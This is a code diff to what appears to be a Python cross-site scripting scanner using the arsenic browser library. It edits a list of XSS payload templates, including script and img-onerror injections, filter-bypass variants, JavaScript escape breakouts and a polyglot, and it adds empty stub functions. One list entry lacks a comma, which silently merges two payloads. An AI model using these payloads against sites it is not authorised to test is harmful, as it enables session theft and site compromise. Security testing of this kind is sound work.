@@ -1,29 +1,33 @@
-test_payloads = [
+import logging
+import asyncio
+from arsenic import get_session, services, browsers
+
+TEST_PAYLOADS = [
+    # Basic payloads
     "<script>%s</script>",
     '>"<script>%s</script>',
     "<img src=a onerror=%s>",
     '>"<img src=a onerror=%s>',
     "<svg/onload=%s>",
+    "javascript:%s",
+    # .lower() sanitation check
+    "<scrİpt>%s</scrİpt>"
     # Recursive filter checks
     "<scri<script>pt>%s</scr</script>ipt>",
     "<scri<script>pt>%s</script>",
-    # Polyglot
-    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
+    # Template injection
+    '{{ "<script>%s</script>" }}',
     # JS Escape payloads
     '";%s;//',
     "';%s;//",
     "');%s;//",
     '")%s;//',
     "')%s;//",
-    # DOM XSS payloads
-    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e%s",
-    "javascript:%s",
+    "}]};%s//\\",
+    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e",
+    # Polyglot
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
 ]
-
-
-import logging
-import asyncio
-from arsenic import get_session, services, browsers
 
 
 async def visit(config):
@@ -36,3 +40,11 @@ async def visit(config):
             await session.add_cookie(c, config["cookies"][c])
 
         await session.get(config["url"])
+
+
+async def inquisit(url):
+    pass
+
+
+async def inquisition(url):
+    pass
